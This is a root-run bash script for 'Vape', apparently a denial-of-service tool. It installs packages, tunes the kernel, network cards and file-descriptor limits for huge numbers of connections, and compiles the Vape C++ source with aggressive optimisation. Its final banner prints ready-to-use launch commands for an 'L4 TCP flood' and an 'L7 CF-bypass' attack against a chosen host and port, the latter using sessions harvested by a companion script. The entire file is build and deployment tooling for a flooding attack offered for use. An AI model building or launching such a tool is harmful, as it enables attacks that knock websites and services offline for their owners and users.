#!/usr/bin/env bash
# Vape OS Tuner — @Xstairs
# Auto-detects Vape_Ultra_1.2.cpp, Vape-1.1.cpp, or Vape-1.0.cpp,
# installs deps, applies max OS tuning, and compiles the vape binary.
# Run as root: sudo bash OS_tune.sh

set -euo pipefail

###############################################################################
# Root check
###############################################################################
if [[ $EUID -ne 0 ]]; then
    echo "Run as root: sudo bash OS_tune.sh"
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
VAPE_BIN="vape"
ULTRA_BIN="vape_ultra"
ULTRA_LINK_FLAGS="-lpthread -lssl -lcrypto"

# ── Auto-detect Vape source (prefer Ultra > 1.1 > 1.0) ───────────────────────
if [[ -f "$SCRIPT_DIR/Vape_Ultra_1.2.cpp" ]]; then
    VAPE_SRC="$SCRIPT_DIR/Vape_Ultra_1.2.cpp"
    VAPE_VER="Vape_Ultra_1.2"
    BUILD_ULTRA=1
elif [[ -f "$SCRIPT_DIR/Vape-1.1.cpp" ]]; then
    VAPE_SRC="$SCRIPT_DIR/Vape-1.1.cpp"
    VAPE_VER="Vape-1.1"
    BUILD_ULTRA=0
elif [[ -f "$SCRIPT_DIR/Vape-1.0.cpp" ]]; then
    VAPE_SRC="$SCRIPT_DIR/Vape-1.0.cpp"
    VAPE_VER="Vape-1.0"
    BUILD_ULTRA=0
else
    echo "ERROR: No Vape source file found in $SCRIPT_DIR"
    exit 1
fi

echo "Detected: $VAPE_VER"
echo ""

###############################################################################
# 1. Package installation
###############################################################################
echo "[1/5] Updating & installing packages..."

if command -v apt-get &>/dev/null; then
    export DEBIAN_FRONTEND=noninteractive
    apt-get update -y -qq
    apt-get upgrade -y -qq
    apt-get install -y -qq \
        build-essential g++ gcc make \
        libssl-dev \
        htop iotop nethogs net-tools \
        nmap iputils-ping iproute2 \
        sysstat ethtool numactl \
        cpufrequtils wget curl git 2>/dev/null || true
elif command -v yum &>/dev/null; then
    yum update -y -q
    yum groupinstall -y "Development Tools" -q
    yum install -y -q gcc-c++ openssl-devel htop iotop net-tools ethtool numactl wget curl git 2>/dev/null || true
elif command -v dnf &>/dev/null; then
    dnf update -y -q
    dnf groupinstall -y "Development Tools" -q
    dnf install -y -q gcc-c++ openssl-devel htop iotop net-tools ethtool numactl wget curl git 2>/dev/null || true
fi
echo "    Packages done."

###############################################################################
# 2. CPU performance governor
###############################################################################
echo "[2/5] Setting CPU governor to performance..."

for cpu in /sys/devices/system/cpu/cpu[0-9]*/cpufreq/scaling_governor; do
    echo performance > "$cpu" 2>/dev/null || true
done
for state in /sys/devices/system/cpu/cpu*/cpuidle/state[1-9]/disable; do
    echo 1 > "$state" 2>/dev/null || true
done
if [[ -f /sys/devices/system/cpu/intel_pstate/no_turbo ]]; then
    echo 0 > /sys/devices/system/cpu/intel_pstate/no_turbo
fi
echo "    CPU governor done."

###############################################################################
# 3. Kernel network tuning
###############################################################################
echo "[3/5] Applying kernel tuning..."

sysctl -w kernel.numa_balancing=0                    >/dev/null
sysctl -w net.ipv4.ip_local_port_range="1024 65535"  >/dev/null
sysctl -w net.ipv4.tcp_tw_reuse=1                    >/dev/null
sysctl -w net.ipv4.tcp_fin_timeout=3                 >/dev/null
sysctl -w net.ipv4.tcp_max_tw_buckets=2000000        >/dev/null
sysctl -w net.ipv4.tcp_synack_retries=1              >/dev/null
sysctl -w net.ipv4.tcp_syn_retries=1                 >/dev/null
sysctl -w net.ipv4.tcp_orphan_retries=1              >/dev/null
sysctl -w net.ipv4.tcp_max_orphans=262144            >/dev/null
sysctl -w net.ipv4.ip_nonlocal_bind=1                >/dev/null
sysctl -w net.core.rmem_max=268435456                >/dev/null
sysctl -w net.core.wmem_max=268435456                >/dev/null
sysctl -w net.core.rmem_default=67108864             >/dev/null
sysctl -w net.core.wmem_default=67108864             >/dev/null
sysctl -w net.ipv4.tcp_rmem="4096 131072 268435456"  >/dev/null
sysctl -w net.ipv4.tcp_wmem="4096 131072 268435456"  >/dev/null
sysctl -w net.ipv4.tcp_mem="786432 2097152 33554432" >/dev/null
sysctl -w net.ipv4.udp_mem="786432 2097152 33554432" >/dev/null
sysctl -w net.core.somaxconn=262144                  >/dev/null
sysctl -w net.ipv4.tcp_max_syn_backlog=262144        >/dev/null
sysctl -w net.core.netdev_max_backlog=65536          >/dev/null
sysctl -w net.core.netdev_budget=600                 >/dev/null
sysctl -w net.core.netdev_budget_usecs=8000          >/dev/null
sysctl -w net.ipv4.tcp_fastopen=3                    >/dev/null
sysctl -w net.ipv4.tcp_keepalive_time=10             >/dev/null
sysctl -w net.ipv4.tcp_keepalive_intvl=3             >/dev/null
sysctl -w net.ipv4.tcp_keepalive_probes=3            >/dev/null
sysctl -w net.ipv4.neigh.default.gc_thresh1=32768    >/dev/null
sysctl -w net.ipv4.neigh.default.gc_thresh2=131072   >/dev/null
sysctl -w net.ipv4.neigh.default.gc_thresh3=262144   >/dev/null
sysctl -w net.core.optmem_max=25165824               >/dev/null
sysctl -w net.core.busy_poll=50                      >/dev/null 2>&1 || true
sysctl -w net.core.busy_read=50                      >/dev/null 2>&1 || true
sysctl -w vm.swappiness=0                            >/dev/null
sysctl -w vm.dirty_ratio=80                          >/dev/null
sysctl -w vm.dirty_background_ratio=5               >/dev/null
sysctl -w vm.overcommit_memory=1                     >/dev/null
sysctl -w vm.max_map_count=1048576                   >/dev/null
sysctl -w fs.file-max=26843545                       >/dev/null
sysctl -w fs.nr_open=26843545                        >/dev/null
echo "    Kernel tuning done."

###############################################################################
# 4. Persistent limits
###############################################################################
echo "[4/5] Setting persistent file descriptor limits..."

LIMITS_CONF="/etc/security/limits.conf"
grep -v "# vape-tune" "$LIMITS_CONF" > /tmp/_lim_tmp 2>/dev/null || true
cp /tmp/_lim_tmp "$LIMITS_CONF"
cat >> "$LIMITS_CONF" <<'LIMITS'
# vape-tune
*    soft nofile 1048576
*    hard nofile 1048576
root soft nofile 1048576
root hard nofile 1048576
*    soft nproc  1048576
*    hard nproc  1048576
LIMITS

ulimit -n 1048576 2>/dev/null || true
ulimit -u 1048576 2>/dev/null || true

if command -v systemctl &>/dev/null; then
    mkdir -p /etc/systemd/system.conf.d
    cat > /etc/systemd/system.conf.d/vape.conf <<'SYSD'
[Manager]
DefaultLimitNOFILE=1048576
DefaultLimitNPROC=1048576
SYSD
fi

for iface in $(ls /sys/class/net/ 2>/dev/null | grep -E '^(eth|ens|enp|eno)'); do
    ethtool -G "$iface" rx 4096 tx 4096 2>/dev/null || true
    ethtool -K "$iface" gro on gso on tso on 2>/dev/null || true
    ethtool -L "$iface" combined "$(nproc)" 2>/dev/null || true
    for irq in $(grep "$iface" /proc/interrupts 2>/dev/null | awk -F: '{print $1}' | tr -d ' '); do
        echo ff > "/proc/irq/${irq}/smp_affinity" 2>/dev/null || true
    done
done
echo "    Limits done."

###############################################################################
# 5. Compile
###############################################################################
echo "[5/5] Compiling $VAPE_VER..."

if [[ "$BUILD_ULTRA" -eq 1 ]]; then
    # Vape_Ultra_1.2 — L4 + L7 with OpenSSL TLS
    g++ -O3 -march=native -mtune=native \
        -funroll-loops -fno-plt          \
        -ffast-math -fomit-frame-pointer \
        -std=c++17                       \
        -o "$SCRIPT_DIR/$ULTRA_BIN"      \
        "$VAPE_SRC"                      \
        $ULTRA_LINK_FLAGS

    strip "$SCRIPT_DIR/$ULTRA_BIN"
    OUT_BIN="$SCRIPT_DIR/$ULTRA_BIN"
else
    # Vape-1.0 / Vape-1.1 — L4 only
    g++ -O3 -march=native -mtune=native \
        -funroll-loops -fno-plt          \
        -ffast-math -fomit-frame-pointer \
        -std=c++17                       \
        -o "$SCRIPT_DIR/$VAPE_BIN"       \
        "$VAPE_SRC"                      \
        -lpthread

    strip "$SCRIPT_DIR/$VAPE_BIN"
    OUT_BIN="$SCRIPT_DIR/$VAPE_BIN"
fi

echo "    Compiled → $OUT_BIN"

###############################################################################
# Done
###############################################################################
CORES=$(nproc)
RAM_GB=$(awk '/MemTotal/{printf "%.0f", $2/1048576}' /proc/meminfo)

echo ""
echo "=============================================================="
echo "  Vape OS Tuner — Complete"
echo "  Version : $VAPE_VER"
echo "  CPUs    : $CORES  |  RAM: ${RAM_GB} GB"
echo "  FD limit: $(ulimit -n)"
echo "  Reboot recommended to apply all persistent limits."
echo ""
if [[ "$BUILD_ULTRA" -eq 1 ]]; then
echo "  Launch (L4 TCP flood):"
echo "    $OUT_BIN <host> <port> l4 50000 $CORES 60"
echo "  Launch (L7 CF-bypass — requires session.json from l7_harvester.py):"
echo "    $OUT_BIN <host> 443 l7 2000 $CORES 60 session.json"
else
echo "  Launch:"
echo "    $OUT_BIN <host> <port>"
echo "    $OUT_BIN <host> <port> 50000 $CORES 60"
echo "    $OUT_BIN <host> <port> 50000 $CORES 60 lownet"
fi
echo "=============================================================="
